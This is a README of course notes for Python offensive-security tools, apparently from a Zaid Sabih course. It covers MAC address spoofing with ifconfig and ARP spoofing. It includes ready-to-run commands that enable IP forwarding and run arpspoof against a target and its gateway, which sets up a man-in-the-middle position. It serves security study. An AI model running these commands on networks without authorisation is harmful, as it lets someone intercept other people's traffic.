# Offensive Security Python
> From Zaid Sabih

* Topics
- Changing MAC Address 
- Network Scanner
- ARP Spoofing
- Packet Sniffer

## Playbook
> Check on how to use these tools 

## Dependencies on PIP
- scapy
- scapy_http

# Notes
> On doing this things manually or with another tool

## Changing MAC ADDRESS
Commands
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
ifconfig wlan0 
```
## ARP SPOOF 
* Reminder you need to enable ip forwarding in Linux First
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Terminal 1 for Target  
```
arpspoof -i <INTERFACE> -t <TARGET IP> <GATEWAY IP>
arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
```

Terminal 2 for Gateway  
```
arpspoof -i <INTERFACE> -t <GATEWAY IP> <TARGET IP>
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 
```

--- 

### Python 3 Compatibility

pip3 install scapy-python3

#### Same line Printing 
print("\r [+] Info counter", end="")

